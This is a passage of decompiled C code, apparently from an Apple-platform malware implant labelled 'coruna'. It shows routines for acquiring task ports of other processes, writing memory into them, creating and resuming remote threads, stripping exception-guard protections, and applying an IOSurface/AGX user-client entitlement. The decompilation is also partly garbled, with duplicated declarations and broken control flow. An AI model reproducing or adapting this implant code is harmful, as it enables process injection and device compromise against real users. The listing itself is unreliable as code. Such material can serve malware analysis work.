      if (version <= u && u < size) {
        if (*flags < 0) {
          if (flags[6] != 1) {
            return;
          }
          lpm10 = *(mach_port_urefs_t **)(flags + 7);
          if ((uint)flags[9] >> 0x18 == 0) {
            if ((mach_port_name_t)lpm10 + 1 < 2) {
              return;
            }
            scratch = 0;
            lk6 = _mach_port_get_refs(*(ipc_space_t *)k_implant_mach_task_self_slot,
                                        (mach_port_name_t)lpm10,0,&scratch);
            if (lk6 != 0) {
              return;
            }
            if (scratch == 0) {
              return;
            }
          }
          else {
            if ((uint)flags[9] >> 0x18 != 1) {
              return;
            }
            if (lpm10 == (mach_port_urefs_t *)0x0) {
              return;
            }
            if (flags[10] != 4) {
              return;
            }
            lm5 = *lpm10;
            lm7 = _getpid();
            if (lm5 == lm7) {
              lpm10 = (mach_port_urefs_t *)(unsigned long)*(uint *)k_implant_mach_task_self_slot;
            }
            else {
              if ((*(mach_port_urefs_t *)(handle + 0x28) == lm5) &&
                 (1 < *(mach_port_name_t *)(handle + 0x2c) + 1)) {
                scratch = 0;
                lk6 = _mach_port_get_refs(*(ipc_space_t *)k_implant_mach_task_self_slot,
                                            *(mach_port_name_t *)(handle + 0x2c),0,&scratch);
                lpm10 = (mach_port_urefs_t *)0x0;
                status = 0x1e020;
                if ((lk6 == 0) && (scratch != 0)) {
                  status = 0;
                  lpm10 = (mach_port_urefs_t *)(unsigned long)*(uint *)(handle + 0x2c);
                }
              }
              else {
                bootargs = 0;
                scratch = lm5;
                status = (**(void (**)(*(long *)(handle + 0x18) + 0x28))
                                  (*(long *)(handle + 0x18),*(uint64_t *)(handle + 0x20),
                                   0xc000001d,&scratch);
                lpm10 = (mach_port_urefs_t *)0x0;
                if (status == 0) {
                  lpm10 = (mach_port_urefs_t *)(unsigned long)bootargs;
                  *(mach_port_urefs_t *)(handle + 0x28) = lm5;
                  *(uint *)(handle + 0x2c) = bootargs;
                }
              }
              if (status != 0) {
                return;
              }
            }
          }
        }
        else {
          lpm10 = (mach_port_urefs_t *)0x0;
        }
        handle = 0;
        if (u - version != 0) {
          handle = (long)flags + (unsigned long)version;
        }
        coruna_mach_msg(handle,err - size,handle,u - version,lpm10,flags[2]);
      }
    }
  }
  return;
}





uint64_t coruna_mach_msg_destroy(int flags,mach_msg_header_t *arg,uint size)
{
  uint u;
  uint size;
  uint64_t version;
  
  if (arg == (mach_msg_header_t *)0x0) {
    return 0xad001;
  }
  if (size == 0) {
    return 0xad001;
  }
  u = flags + 0xefffbffe;
  if (u < 0xb) {
    size = 1 << (unsigned long)(u & 0x1f);
    if ((size & 0x22e) == 0) {
      if ((size & 0x91) != 0) {
        version = 0x1e01b;
        _bzero(arg,(unsigned long)size);
        return version;
      }
      if (flags != 0) {
      version = 0x1e021;
      _bzero(arg,(unsigned long)size);
      return version;
      }
      goto cleanup;
    }
  }
  else {
done:
    if (flags != 0) {
      version = 0x1e021;
      _bzero(arg,(unsigned long)size);
      return version;
    }
cleanup:
    arg->msgh_remote_port = 0;
    _mach_msg_destroy(arg);
  }
  version = 0;
fail:
  _bzero(arg,(unsigned long)size);
  return version;
}





uint coruna_task_exc_guard(uint64_t val)
{
  uint u;
  uint size;
  uint scratch;
  
  u = 0xad001;
  if ((1 < (int)val + 1U) &&
     (u = 0,
     k_implant_task_get_exc_guard_behavior_slot != (uint8_t *)0x0 &&
     k_implant_task_set_exc_guard_behavior_slot != (uint8_t *)0x0)) {
    scratch = 0;
    u = _task_get_exc_guard_behavior(val,&scratch);
    if (u == 0) {
      if ((scratch & 0x88) == 0) {
        u = 0;
      }
      else {
        scratch = scratch & 0xffffff77;
        size = _task_set_exc_guard_behavior(val);
        u = 0;
        if (size != 0) {
          u = size | 0x80000000;
        }
      }
    }
    else {
      u = u | 0x80000000;
    }
  }
  return u;
}





uint32_t coruna_port_kernel_object(uint64_t val)
{
  mach_port_name_t name;
  bool err;
  ipc_space_t task;
  kern_return_t lk2;
  long handle;
  mach_msg_type_number_t lm4;
  uint32_t u;
  int err;
  uint size;
  unsigned long version;
  uint scratch;
  uint bootargs;
  mach_msg_type_number_t thread_attr;
  ipc_info_tree_name_array_t host_info;
  mach_msg_type_number_t serial_buf;
  ipc_info_name_array_t action;
  ipc_info_space_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  kern_return_t path_buf;
  
  u = 0xad025;
  task = (ipc_space_t)val;
  if (task + 1 < 2) {
    u = 0xad001;
  }
  else {
    path_buf = 5;
    stack_guard = 0;
    sa_saved = 0;
    sa_new = 0;
    err = 0x19;
    do {
      handle = __dyld_process_info_create(val,0,&path_buf);
      if (handle != 0) {
        sa_saved = 0;
        stack_guard = 0;
        sa_new = 0xff;
        __dyld_process_info_get_state(handle,&stack_guard);
        size = (uint)(byte)sa_new;
        if (size - 0x30 < 0x21) {
          __dyld_process_info_release(handle);
          return 0;
        }
        __dyld_process_info_release(handle);
        if (size == 0) {
          return 0xad025;
        }
        break;
      }
      _usleep(100000);
      err = err + -1;
    } while (err != 0);
    block_ctx.iis_genno_mask = 0;
    block_ctx.iis_table_size = 0;
    block_ctx.iis_table_next = 0;
    block_ctx.iis_tree_size = 0;
    block_ctx.iis_tree_small = 0;
    block_ctx.iis_tree_hash = 0;
    action = (ipc_info_name_array_t)0x0;
    serial_buf = 0;
    host_info = (ipc_info_tree_name_array_t)0x0;
    thread_attr = 0;
    lk2 = _mach_port_space_info(task,&block_ctx,&action,&serial_buf,&host_info,&thread_attr);
    if (lk2 == 0) {
      path_buf = 0;
      if (serial_buf != 0) {
        handle = 0;
        err = false;
        version = 1;
        lm4 = serial_buf;
        do {
          scratch = 0;
          bootargs = 0;
          name = *(mach_port_name_t *)((long)&action->iin_name + handle);
          if (1 < name + 1) {
            path_buf = _mach_port_kernel_object(task,name,&bootargs,&scratch);
            err = (bool)((path_buf == 0 && bootargs == 0x19) | err);
            lm4 = serial_buf;
          }
          if (lm4 <= version) break;
          version = version + 1;
          handle = handle + 0x1c;
        } while (!err);
        u = 0;
        if (!err) {
          u = 0xad025;
        }
        if ((action != (ipc_info_name_array_t)0x0) && (lm4 != 0)) {
          _mach_vm_deallocate(*(vm_map_t *)k_implant_mach_task_self_slot,(mach_vm_address_t)action
                              ,(unsigned long)lm4 * 0x1c);
        }
      }
      if ((host_info != (ipc_info_tree_name_array_t)0x0) && (thread_attr != 0)) {
        _mach_vm_deallocate(*(vm_map_t *)k_implant_mach_task_self_slot,(mach_vm_address_t)host_info,
                            (unsigned long)thread_attr * 0x24);
      }
    }
  }
  return u;
}





uint64_t
uint64_t coruna_mach_vm_allocate(uint64_t val,mach_vm_size_t arg,int flags,mach_vm_address_t *arg_x)
{
  vm_map_t target;
  kern_return_t lk1;
  uint64_t u;
  mach_vm_address_t scratch;
  
  u = 0xad001;
  if ((arg_x != (mach_vm_address_t *)0x0) && (arg != 0)) {
    u = 0x1e009;
    target = (vm_map_t)val;
    if (1 < target + 1) {
      scratch = 0;
      lk1 = _mach_vm_allocate(target,&scratch,arg,flags);
      if (lk1 == 0) {
        lk1 = _mach_vm_protect(target,scratch,arg,0,3);
        if (lk1 == 0) {
          u = 0;
          *arg_x = scratch;
        }
        else {
          coruna_mach_vm_deallocate(val,scratch,arg,0);
          u = 0x1e00d;
        }
      }
      else {
        u = 0x1e00a;
      }
    }
  }
  return u;
}





uint32_t coruna_mach_vm_deallocate(uint64_t val,mach_vm_address_t arg,unsigned long arg_x,int flags)
{
  kern_return_t lk1;
  uint32_t u;
  
  if ((arg == 0) && ((int)arg_x != 0)) {
    u = 0xad001;
  }
  else {
    u = 0x1e009;
    if ((1 < (vm_map_t)val + 1) && (u = 0, (int)arg_x != 0)) {
      if (flags != 0) {
        coruna_mach_vm_write(val,arg,arg_x);
      }
      lk1 = _mach_vm_deallocate((vm_map_t)val,arg,arg_x & 0xffffffff);
      u = 0;
      if (lk1 != 0) {
        u = 0x1e00b;
      }
    }
  }
  return u;
}





uint64_t coruna_sysctl_proc_cputype(mach_port_name_t arg,uint32_t *size,uint *size_x)
{
  kern_return_t lk1;
  int err;
  uint u;
  uint64_t *ptr;
  uint64_t size;
  size_t scratch;
  size_t bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  int action [14];
  long block_ctx;
  
  block_ctx = *(long *)k_implant_stack_chk_guard_slot;
  serial_buf = 0;
  if (arg + 1 < 2 || size == (uint32_t *)0x0) {
    size = 0xad001;
  }
  else {
    size = 0x1e002;
    lk1 = _pid_for_task(arg,(int *)((long)&serial_buf + 4));
    if (lk1 == 0) {
      host_info = 0;
      scratch = 0;
      thread_attr = 0;
      thread_attr = 0;
      bootargs = 0;
      err = _proc_pidinfo(serial_buf,0x13,0,&thread_attr,8);
      if (err == 8) {
        ptr = &thread_attr;
        u = thread_attr & 0xffffff;
      }
      else {
        action[6] = 0;
        action[7] = 0;
        action[4] = 0;
        action[5] = 0;
        action[10] = 0;
        action[0xb] = 0;
        action[8] = 0;
        action[9] = 0;
        action[2] = 0;
        action[3] = 0;
        action[0] = 0;
        action[1] = 0;
        bootargs = 0xc;
        err = _sysctlnametomib("sysctl.proc_cputype",action,&bootargs);
        if (*(long *)k_implant_stack_chk_guard_slot == block_ctx) {
        return size;
        }
        ___stack_chk_fail();
      }
      *size = *(uint32_t *)ptr;
      size = 0;
      if (size_x != (uint *)0x0) {
        *size_x = u;
      }
    }
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == block_ctx) {
    return size;
  }
  ___stack_chk_fail();
}





uint64_t coruna_mach_vm_read_overwrite(uint64_t val,long *handle,uint64_t id_2)
{
  bool err;
  task_name_t target_task;
  long handle;
  uint64_t u;
  long addr;
  bool status;
  mach_vm_size_t scratch;
  mach_msg_type_number_t bootargs;
  mach_vm_address_t thread_attr [2];
  uint32_t host_info;
  kern_return_t serial_buf;
  uint64_t action;
  uint64_t scratch;
  long block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t sa_new;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t path_buf;
  uint64_t stack_guard;
  uint64_t tmp_buf;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t region;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  long plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t url_buf;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t json_buf;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t frame;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t work;
  uint64_t cache_27;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t cache;
  uint64_t cache_30;
  uint64_t cache_31;
  uint64_t cache_32;
  long cache_20;
  
  cache_20 = *(long *)k_implant_stack_chk_guard_slot;
  u = 0xad001;
  target_task = (task_name_t)val;
  if (*(long *)k_implant_stack_chk_guard_slot == cache_20) {
  return u;
  }
  ___stack_chk_fail();
}





uint64_t coruna_dladdr(uint64_t val,long handle,long *addr_2)
{
  int err;
  uint64_t u;
  long handle;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t *serial_buf;
  uint64_t *action;
  char *block_ctx;
  long stack_guard;
  uint64_t sa_saved;
  uint64_t scratch;
  uint64_t sa_new;
  uint64_t *path_buf;
  uint64_t tmp_buf;
  uint8_t region;
  uint64_t plist;
  uint64_t *url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint32_t work;
  char *cache;
  long cache_20;
  uint64_t bootargs;
  uint64_t thread_attr;
  
  u = 0xad001;
  if (((1 < (int)val + 1U) && (handle != 0)) && (addr_2 != (long *)0x0)) {
    cache_20 = 0;
    cache = (char *)0x0;
    thread_attr = 0;
    bootargs = 0;
    err = _dladdr(handle,&cache);
    if (err == 0) {
      u = 0xad00b;
    }
    else {
      u = 0xad014;
      if ((cache != (char *)0x0) && (*cache != '\0' && cache_20 != 0)) {
        work = 5;
        handle = __dyld_process_info_create(val,0,&work);
        u = 0xad00b;
        if (handle != 0) {
          action = &plist;
          plist = 0;
          json_buf = k_implant_rodata_word_26a68;
          frame = 0;
          serial_buf = &sa_new;
          sa_new = 0;
          tmp_buf = k_implant_rodata_word_26a68;
          region = 0;
          scratch = k_implant_nsconcretestackblock_slot;
          bootargs = k_implant_rodata_word_26a70;
          thread_attr = coruna_wire_bind_sym;
          host_info = &k_implant_rodata_word_28b18;
          stack_guard = cache_20;
          block_ctx = cache;
          scratch = thread_attr;
          sa_saved = bootargs;
          path_buf = serial_buf;
          url_buf = action;
          __dyld_process_info_for_each_image(handle,&scratch);
          u = 0xad011;
          if ((*(char *)(path_buf + 3) != '\0') && (url_buf[3] != 0)) {
            u = 0;
            *addr_2 = (url_buf[3] + handle) - cache_20;
          }
          __dyld_process_info_release(handle);
          __Block_object_dispose(&sa_new,8);
          __Block_object_dispose(&plist,8);
        }
      }
    }
  }
  return u;
}





void coruna_wire_bind_sym(long handle,uint64_t val,uint64_t id_2,char *path)
{
  int err;
  
  if (((*(char *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18) == '\0' && path != (char *)0x0
       ) && (*path != '\0')) && (err = _strcmp(path,*(char **)(handle + 0x30)), err == 0)
     ) {
    *(uint64_t *)(*(long *)(*(long *)(handle + 0x28) + 8) + 0x18) = val;
    *(uint8_t *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18) = 1;
  }
  return;
}





void coruna_block_assign_243c4(long handle,long addr_2)
{
  void (*ptr)(void);
  unsigned long unaff_x30;
  
  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),8);
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  __Block_object_assign((void *)(handle + 0x28),*(void **)(addr_2 + 0x28),8);
  return;
}





void coruna_driver_copy_port_1918(long handle)
{
  void (*ptr)(void);
  unsigned long unaff_x30;
  
  __Block_object_dispose(*(void **)(handle + 0x28),8);
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  __Block_object_dispose(*(void **)(handle + 0x20),8);
  return;
}





uint64_t coruna_task_dyld_info(task_name_t arg,long handle)
{
  kern_return_t lk1;
  uint64_t u;
  mach_msg_type_number_t scratch;
  long bootargs;
  unsigned long thread_attr;
  uint host_info;
  
  bootargs = 0;
  thread_attr = 0;
  host_info = 0;
  scratch = 5;
  if (handle == 0) {
    u = 0xad001;
  }
  else if (arg + 1 < 2) {
    u = 0x1e009;
  }
  else {
    lk1 = _task_info(arg,0x11,(task_info_t)&bootargs,&scratch);
    u = 0x1e002;
    if ((lk1 == 0) && (scratch == 5)) {
      if ((bootargs == 0) || (0xc800 < thread_attr)) {
        u = 0x1e001;
      }
      else {
        u = 0x1e001;
        if (host_info < 2) {
          u = 0;
          *(bool *)handle = host_info == 1;
          *(bool *)(handle + 1) = host_info == 1;
          *(long *)(handle + 8) = bootargs;
          *(unsigned long *)(handle + 0x10) = thread_attr;
        }
      }
    }
  }
  return u;
}





uint32_t coruna_mach_vm_write(vm_map_t arg,mach_vm_address_t arg_x,uint size)
{
  uint dataCnt;
  kern_return_t lk1;
  void *data;
  uint u;
  uint32_t size;
  int err;
  
  if ((((arg_x != 0) || (size = 0xad001, size == 0)) && (size = 0x1e009, 1 < arg + 1)) &&
     (size = 0, size != 0)) {
    u = size;
    if (0xfff < size) {
      u = 0x1000;
    }
    data = _calloc((unsigned long)size,1);
    if (data == (void *)0x0) {
      size = 0xad009;
    }
    else {
      err = 0;
      do {
        dataCnt = size;
        if (u <= size) {
          dataCnt = u;
        }
        lk1 = _mach_vm_write(arg,arg_x,(vm_offset_t)data,dataCnt);
        if (lk1 != 0) {
          err = lk1;
        }
        arg_x = arg_x + dataCnt;
        size = size - dataCnt;
      } while (size != 0);
      size = 0;
      if (err != 0) {
        size = 0x1e00f;
      }
      _free(data);
    }
  }
  return size;
}





uint64_t
uint64_t coruna_mach_vm_write_24614(short *arg,int64_t arg_x,vm_map_t arg_x_x,int flags,uint64_t val, uint64_t *id_2,uint64_t size_3,uint size)
{
  uint u;
  int err;
  kern_return_t lk3;
  uint32_t size;
  uint64_t version;
  unsigned long scratch;
  unsigned long scratch;
  unsigned long bootargs;
  unsigned long bootargs;
  unsigned long thread_attr;
  unsigned long thread_attr;
  unsigned long host_info;
  unsigned long host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t serial_buf;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t action;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t block_ctx;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t stack_guard;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t sa_saved;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  long sa_new;
  long path_buf;
  long tmp_buf;
  uint64_t cache_22;
  uint64_t region;
  uint64_t plist;
  uint8_t *url_buf;
  uint32_t json_buf;
  long frame;
  
  frame = *(long *)k_implant_stack_chk_guard_slot;
  version = 0xad00a;
  if (((arg != (short *)0x0) && (*arg == 2)) && (1 < (ushort)arg[1] && arg_x != 0)) {
    version = 0x1e011;
    if (arg_x_x + 1 < 2) {
      version = 0x1e009;
    }
    else if (flags + 1U < 2) {
      version = 0x1e014;
    }
    else {
      err = coruna_port_name_valid(id_2,val);
      if (err == 0) {
        version = 0x1e010;
      }
      else if (((size_3 != 0) &&
               (((uint)(size_3 >> 0x20 != 0) & ((uint)val ^ 0xffffffff)) == 0)) &&
              (0x24f < size)) {
        path_buf = 0;
        sa_new = 0;
        cache_22 = 0;
        tmp_buf = 0;
        cache = 0;
        sa_saved = 0;
        cache_21 = 0;
        cache_20 = 0;
        json_buf = 0;
        stack_guard = 0;
        work = 0;
        frame = 0;
        region = 0;
        block_ctx = 0;
        url_buf = 0;
        plist = 0;
        sa_new = 0;
        action = 0;
        tmp_buf = 0;
        path_buf = 0;
        block_ctx = 0;
        serial_buf = 0;
        sa_saved = 0;
        stack_guard = 0;
        action = 0;
        serial_buf = 0;
        bootargs = 0;
        bootargs = 0;
        thread_attr = 0;
        thread_attr = 0;
        if ((uint)val == 0) {
          region = coruna_u64_pack(((int)id_2[7]), (int)id_2[6]);
          plist = coruna_u64_pack(((int)id_2[9]), (int)id_2[8]);
          u = (size + (int)size_3) - 0x110;
          scratch = coruna_u64_pack(((int)id_2[3]), (int)id_2[2]);
          scratch = coruna_u64_pack(((int)id_2[5]), (int)id_2[4]);
          host_info = (unsigned long)u << 0x20;
          size = (uint32_t)*id_2;
          host_info = NEON_rev64(coruna_u64_pack(((int)id_2[1]), (size)),4);
          if ((*id_2 & 1) != 0) {
            host_info = coruna_u64_pack((size), ((uint32_t))host_info) & 0xfffffffeffffffff;
            serial_buf = 0x20;
          }
          lk3 = _mach_vm_write(arg_x_x,(unsigned long)u,(vm_offset_t)&region,0x10);
          if (lk3 != 0) {
            version = 0x1e00e;
            if (*(long *)k_implant_stack_chk_guard_slot == frame) {
            return version;
            }
            ___stack_chk_fail();
          }
          json_buf = 0x11;
          size = 1;
        }
        else {
          scratch = id_2[3];
          scratch = id_2[2];
          bootargs = id_2[5];
          bootargs = id_2[4];
          thread_attr = id_2[7];
          thread_attr = id_2[6];
          host_info = id_2[9];
          host_info = id_2[8];
          tmp_buf = coruna_identity(*id_2);
          if ((tmp_buf != 0) && (tmp_buf == 0)) {
            tmp_buf = 0;
          }
          sa_new = coruna_identity(id_2[1]);
          if ((sa_new != 0) && (sa_new == 0)) {
            sa_new = 0;
          }
          json_buf = 0x44;
          size = 6;
          path_buf = size_3 + size + -0x180;
        }
        region = coruna_u64_pack((flags), (arg_x_x));
        plist = coruna_u64_pack((plist), (size));
        url_buf = (uint8_t *)&scratch;
        version = (**(void (**)(arg + 0x14))(arg,arg_x,0x4000001e,&region);
      }
    }
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == frame) {
    return version;
  }
  ___stack_chk_fail();
}





bool coruna_port_name_valid(unsigned long *arg,uint size)
{
  unsigned long u;
  
  if (arg != (unsigned long *)0x0) {
    u = *arg;
    if (u == 0) {
      return false;
    }
    if ((size & 1) != 0) {
      return u != 0;
    }
    if ((((((u >> 0x20 == 0) && (*(int *)((long)arg + 0xc) == 0)) &&
          (*(int *)((long)arg + 0x14) == 0)) &&
         ((*(int *)((long)arg + 0x1c) == 0 && (*(int *)((long)arg + 0x24) == 0)))) &&
        ((*(int *)((long)arg + 0x2c) == 0 &&
         ((*(int *)((long)arg + 0x34) == 0 && (*(int *)((long)arg + 0x3c) == 0)))))) &&
       (*(int *)((long)arg + 0x44) == 0)) {
      return *(int *)((long)arg + 0x4c) == 0;
    }
  }
  return false;
}





uint64_t
uint64_t coruna_thread_create_resume(short *arg,int64_t arg_x,uint64_t val,uint64_t id_2,uint64_t size_3, uint64_t off_4,uint64_t off_5)
{
  int err;
  kern_return_t lk2;
  uint64_t u;
  thread_act_t scratch [3];
  
  if (arg == (short *)0x0) {
    return 0xad00a;
  }
  if (*arg != 2) {
    return 0xad00a;
  }
  if ((ushort)arg[1] < 2 || arg_x == 0) {
    return 0xad00a;
  }
  if ((task_t)val + 1 < 2) {
    return 0x1e009;
  }
  err = coruna_port_name_valid(size_3,id_2);
  if (err == 0) {
    return 0x1e010;
  }
  if (off_4 == 0) {
    return 0x1e011;
  }
  if (((uint)(off_4 >> 0x20 != 0) & ((uint)id_2 ^ 0xffffffff)) != 0) {
    return 0x1e011;
  }
  if ((uint)off_5 < 0x250) {
    return 0x1e011;
  }
  scratch[0] = 0;
  lk2 = _thread_create((task_t)val,scratch);
  if (lk2 != 0) {
    return 0x1e00c;
  }
  if (scratch[0] + 1 < 2) {
    return 0x1e00c;
  }
  u = coruna_mach_vm_write_24614(arg,arg_x,val,scratch[0],id_2,size_3,off_4,off_5);
  if ((int)u == 0) {
    scratch[1] = 0x7f;
    if (1 < scratch[0] + 1) {
      _thread_policy_set(scratch[0],3,(thread_policy_t)(scratch + 1),1);
    }
    lk2 = _thread_resume(scratch[0]);
    if (lk2 == 0) {
      u = 0;
      _mach_port_deallocate(*(ipc_space_t *)k_implant_mach_task_self_slot,scratch[0]);
      return u;
    }
    u = 0x1e013;
  }
  _thread_terminate(scratch[0]);
code_r0x00024a50:
  _mach_port_deallocate(*(ipc_space_t *)k_implant_mach_task_self_slot,scratch[0]);
  return u;
}





void coruna_task_for_pid(long *handle,int flags,uint32_t *size)
{
  pid_t lp1;
  uint64_t u;
  uint32_t size;
  int scratch;
  uint32_t bootargs;
  uint32_t thread_attr[2];
  uint8_t *host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_implant_stack_chk_guard_slot;
  u = 0xad001;
  if (((handle != (long *)0x0) && (0 < flags)) && (size != (uint32_t *)0x0)) {
    lp1 = _getpid();
    if (lp1 == flags) {
      u = 0;
      size = *(uint32_t *)k_implant_mach_task_self_slot;
    }
    else {
      bootargs = 0;
      thread_attr[0] = 0xc000001d;
      scratch = flags;
      host_info = (uint8_t *)&scratch;
      u = (**(void (**)(*handle + 0x40))(*handle,handle + 1,thread_attr,1,0);
      size = bootargs;
      if (*(long *)k_implant_stack_chk_guard_slot != serial_buf) {
      ___stack_chk_fail(u);
      }
      return;
    }
    *size = size;
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot != serial_buf) {
    ___stack_chk_fail(u);
  }
  return;
}





unsigned long coruna_apply_iosurface_entitlement(long *arg,uint val)

{
  uint u;
  int status;
  unsigned long type_id;
  int *i;
  uint *buf;
  unsigned long type_id_15;
  long serial_9;
  long serial_17;
  uint thread_attr;
  uint32_t cache_113;
  char *host_info;
  uint64_t serial_buf;
  size_t action;
  int cache_115;
  long stack_guard;
  uint32_t sa_saved[2];
  unsigned long cache_34;
  uint32_t path_buf;
  unsigned long cache_36;
  uint32_t region;
  unsigned long plist;
  uint32_t cache_37;
  unsigned long url_buf;
  uint32_t cache_39[2];
  uint *json_buf;
  long frame;
  
  frame = *(long *)k_implant_stack_chk_guard_slot;
  type_id_15 = 0xad001;
  type_id = type_id_15;
  if (((arg != (long *)0x0) && (val != 0)) && (val != 0xffffffff)) {
    sa_saved[0] = 0x15;
    cache_34 = (unsigned long)val;
    path_buf = 0x1f;
    region = 0x22;
    cache_37 = 0x17;
    cache_36 = cache_34;
    plist = cache_34;
    url_buf = cache_34;
    type_id = (**(void (**)(*arg + 0x40))(*arg,arg + 1,sa_saved,4,0);
    if ((int)type_id == 0) {
      serial_9 = *arg;
      if ((serial_9 == 0) || (serial_17 = arg[1], serial_17 == 0)) {
        type_id = 0xad001;
      }
      else {
        cache_113 = 0;
        thread_attr = val;
        type_id = (**(void (**)(serial_9 + 0x28))(serial_9,serial_17,0xc000001b,&thread_attr);
        if ((int)type_id == 0) {
          u = cache_113 >> 0x18;
          cache_113 = cache_113 & 0xffffff00;
          if (k_implant_rodata_word_26a08 <= *(double *)k_implant_dyldversionnumber_slot) {
            cache_113 = coruna_cat(1,(uint16_t)cache_113);
            cache_113 = coruna_cat((char)u,(uint32_t)cache_113);
          }
          type_id = (**(void (**)(serial_9 + 0x28))(serial_9,serial_17,0x4000001b,&thread_attr);
          if ((int)type_id == 0) {
            serial_9 = *arg;
            stack_guard = arg[1];
            type_id = type_id_15;
            if ((serial_9 != 0) && (stack_guard != 0)) {
              cache_115 = 0;
              action = 4;
              status = _sysctlbyname("hw.cpufamily",&cache_115,&action,(void *)0x0,0);
              if (status == 0) {
                if (cache_115 == 0x1b588bb3) {
                  host_info = 
                  "<dict><key>com.apple.security.iokit-user-client-class</key><array><string>IOSurfaceRootUserClient</string><string>AGXDeviceUserClient</string></array></dict>"
                  ;
                  serial_buf = k_implant_rodata_word_26ad0;
                  cache_39[0] = 0x40000010;
                  json_buf = &thread_attr;
                  thread_attr = val;
                  type_id = (**(void (**)(serial_9 + 0x40))(serial_9,&stack_guard,cache_39,1,0);
                }
                else {
                  type_id = 0;
                }
              }
              else {
                i = ___error();
                status = *i;
                buf = (uint *)___error();
                u = -*buf;
                if (-1 < status) {
                  u = *buf;
                }
                type_id = (unsigned long)(u | 0x40000000);
              }
            }
          }
        }
      }
    }
  }
  if (*(long *)k_implant_stack_chk_guard_slot == frame) {
    return type_id;
  }
  ___stack_chk_fail();
}





int coruna_rwlock_iface_destroy(long *handle)
{
  int err;
  int status;
  
  if (handle == (long *)0x0) {
    status = 0xad001;
  }
  else {
    if (handle[1] == 0) {
      status = 0;
    }
    else {
      err = (**(void (**)(*handle + 0x30))();
      status = (**(void (**)(*handle + 0x20))(*handle,handle[1]);
      if (err != 0) {
        status = err;
      }
    }
    *handle = 0;
    handle[1] = 0;
    _free(handle);
  }
  return status;
}





uint64_t coruna_rwlock_iface_create(uint64_t *val)
{
  uint64_t u;
  uint32_t *ptr;
  uint64_t scratch;
  
  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else {
    scratch = 0;
    u = coruna_rwlock_init(&scratch);
    if ((int)u == 0) {
      ptr = _calloc(1,0x38);
      if (ptr == (uint32_t *)0x0) {
        coruna_rwlock_destroy(scratch);
        u = 0xad009;
      }
      else {
        u = 0;
        *ptr = 0x10001;
        *(uint64_t *)(ptr + 2) = scratch;
        ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_pthread_rwlock_unlock;
        ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_pthread_rwlock_rdlock;
        ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_pthread_rwlock_rdlock;
        ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_pthread_rwlock_rdlock;
        ((void (**)(void *, long, uint64_t))(ptr + 0xc))[0] = coruna_pthread_rwlock_unlock_25548;
        *val = ptr;
      }
    }
  }
  return u;
}





uint8_t * coruna_implant08_via_ctx_free_4(long *handle,int *flags,unsigned long arg)
{
  uint8_t *ptr;
  long scratch;
  
  scratch = 0;
  ptr = (uint8_t *)0xad001;
  if (((handle != (long *)0x0) && (flags != (int *)0x0)) && ((uint)arg != 0)) {
    if ((((uint)arg < 9) || (*flags != -0xff24111)) ||
       ((flags[1] == 0 || ((arg & 0xffffffff) <= ((unsigned long)(uint)flags[1] << 4 | 8))))) {
      ptr = &k_implant_slot_700b;
    }
    else {
      ptr = (uint8_t *)coruna_rwlock_iface_create(&scratch);
      if ((int)ptr == 0) {
        ptr = (uint8_t *)(**(void (**)(scratch + 0x10))(scratch,flags,arg);
        if ((int)ptr == 0) {
          *handle = scratch;
        }
        else {
          coruna_ctx_free();
        }
      }
    }
  }
  return ptr;
}





uint64_t coruna_ctx_free(uint64_t *val)
{
  uint64_t u;
  
  if ((val == (uint64_t *)0x0) || (val[1] == 0)) {
    u = 0xad001;
  }
  else {
    u = coruna_rwlock_destroy();
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[6] = 0;
    _free(val);
  }
  return u;
}





uint8_t * coruna_implant08_via_ctx_free_5(long *handle,long addr_2)
{
  uint *ptr;
  int err;
  uint u;
  bool err;
  int status;
  void *ptr;
  long handle;
  long addr;
  long off;
  long base;
  uint8_t *buf;
  unsigned long size;
  uint scratch;
  void *bootargs;
  long thread_attr;
  
  buf = (uint8_t *)0xad001;
  thread_attr = 0;
  if (((handle != (long *)0x0) && (addr_2 != 0)) &&
